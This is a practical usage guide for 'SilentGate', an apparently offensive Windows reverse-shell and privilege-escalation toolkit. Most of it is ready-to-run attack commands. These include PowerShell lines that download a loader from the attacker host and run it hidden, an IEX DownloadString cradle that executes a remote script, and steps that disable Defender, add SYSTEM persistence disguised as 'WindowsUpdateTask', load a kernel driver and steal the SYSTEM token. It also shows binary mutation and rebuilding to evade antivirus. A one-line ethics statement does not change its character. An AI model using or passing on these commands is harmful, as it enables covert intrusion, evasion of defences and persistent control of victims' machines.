# SilentGate — Complete Practical Guide
**Author: JarDani**

---

## Prerequisites

### Kali Linux Setup
```bash
sudo apt install mingw-w64 python3 netcat-traditional
pip install rich --break-system-packages
```

### Clone Repository
```bash
git clone https://github.com/JarDaNi686/SilentGate.git ~/silentgate
cd ~/silentgate
```

---

## Usage — Centralized Launcher

```bash
sudo python3 silentgate.py
```

The launcher prompts for:

Your Kali IP → auto-detected
Target IP → Windows machine IP
Listener port → default 443
HTTP port → default 8080


Then automatically:
- Quantum mutates sg_loader.exe (unique binary every run)
- Starts HTTP server
- Shows Level 1 and Level 2 commands
- Starts nc listener

---

## Level 1 — Medium Shell

**Use when:** Initial access to any Windows target
**Requirement:** None — zero user interaction

Run these 3 commands on target Windows machine:

```powershell
New-Item -ItemType Directory -Path 'C:\ProgramData\lpe' -Force | Out-Null
(New-Object Net.WebClient).DownloadFile('http://KALI:8080/output/sg_loader.exe','C:\ProgramData\lpe\sg_loader.exe')
Start-Process 'C:\ProgramData\lpe\sg_loader.exe' -WindowStyle Hidden
```

Shell connects automatically to Kali nc listener.

**Result:**

whoami → desktop-xxxxxxx\username
Mandatory Label\Medium Mandatory Level


---

## Level 2 — SYSTEM Shell

**Use when:** Need full SYSTEM control + persistence
**Requirement:** One UAC click from target user

From medium shell (in Kali nc), paste:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://KALI:8080/output/level2.ps1')
```

UAC prompt appears on target screen. User clicks YES once.

**What happens automatically:**
1. Defender disabled silently
2. Persistence added via scheduled task (survives reboot)
3. Kernel driver installed
4. SYSTEM token stolen
5. SYSTEM shell connects to Kali

**Result:**

whoami → nt authority\system
Mandatory Label\System Mandatory Level


---

## Persistence

After Level 2, shell reconnects automatically after reboot:

Scheduled task: WindowsUpdateTask
Runs as: SYSTEM
Trigger: At system startup
Binary: C:\ProgramData\lpe\sg_system.exe


No user interaction needed after reboot.

---

## Network Configuration

Works on any network — IP configured automatically by silentgate.py:

Bridge mode: 192.168.178.x (recommended — lower latency)
NAT mode: 192.168.217.x (also works)
Any network: auto-detected by silentgate.py


---

## Quantum Evasion Engine

Every run generates mathematically unique binary:

```bash
# Manual quantum build
python3 core/quantum_mutate.py output/sg_loader.c /tmp/mutated.c
x86_64-w64-mingw32-gcc /tmp/mutated.c -o output/sg_loader.exe -lws2_32 -O2 -mwindows
```

Each build has:
- Different MD5 hash
- Different GF(2⁸) polynomial
- Different Lorenz chaos parameters
- Different XOR key
- Different Poisson sleep timing

---

## Manual Compilation

If not using silentgate.py:

```bash
# Calculate IP hex (little endian)
python3 -c "
import socket, struct
ip = '192.168.1.100'
val = struct.unpack('<I', socket.inet_aton(ip))[0]
print(f'C2_IP = 0x{val:08X}')
"

# Port hex (network byte order)
# 443  → 0xBB01
# 4444 → 0x5C11

# Compile
x86_64-w64-mingw32-gcc output/sg_loader.c \
    -o output/sg_loader.exe \
    -lws2_32 -O2 -mwindows \
    -DC2_IP=0xYOURIP \
    -DC2_PORT=0xYOURPORT
```

---

## Kernel Driver (SYSTEM via test signing)

For lab/VM environments with test signing enabled:

```powershell
# Enable test signing (VM only - shows watermark)
bcdedit /set testsigning on
# Reboot

# Install cert
certutil -addstore TrustedPublisher C:\ProgramData\lpe\sg.crt

# Load driver
sc.exe create SilentGate binPath= "C:\ProgramData\lpe\sg.sys" type= kernel start= demand
sc.exe start SilentGate

# Steal SYSTEM token
C:\ProgramData\lpe\stk.exe
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| No shell after running commands | Check nc listener is running before binary |
| Binary detected | Run silentgate.py again — new quantum binary |
| HTTP 404 | Check HTTP server started correctly |
| Level 2 no UAC | UAC may be disabled — run stk.exe directly |
| Shell drops immediately | Use PowerShell not cmd.exe |

---

## Lab Environment

| Machine | Role | OS |
|---------|------|----|
| Kali 2026.x | Attacker | Linux |
| Win10 19045 | Target | Windows 10 22H2 |
| Win11 26200 | Target | Windows 11 |

---

## Ethical Statement

For authorised penetration testing and security research only.
Written permission required before testing any system.

---

## Author

**JarDani** — github.com/JarDaNi686
